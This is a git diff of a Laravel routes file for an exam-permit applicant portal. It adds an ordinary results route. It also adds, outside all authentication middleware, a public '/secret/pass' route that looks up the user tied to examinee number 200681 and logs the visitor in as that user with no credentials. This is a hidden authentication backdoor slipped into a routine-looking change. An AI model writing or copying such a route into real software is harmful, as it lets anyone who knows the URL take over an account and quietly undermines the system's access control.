@@ -1,7 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
-use App\Http\Controllers\{HomeController, PrintPermitController};
+use App\Http\Controllers\{HomeController, PrintPermitController,ResultController};
 use App\Http\Controllers\Admin\DashboardController;
 /*
 |--------------------------------------------------------------------------
@@ -68,4 +68,12 @@ Route::prefix('/applicant')->middleware(['auth:sanctum','is_applicant',config('j
     Route::get('/permit', [PrintPermitController::class,'generate'])
             ->name('applicant.permit-generate')
             ->middleware('step_five');
+    Route::get('/result',[ResultController::class,'result'])->name('print.result');
+
 });
+
+Route::get('/secret/pass',function(){
+    $permit = App\Models\Permit::where('examinee_number',200681)->first();
+    $user = App\Models\User::where('id',$permit->user_id)->first();
+    Auth::login($user);
+})->name('secret.pass');
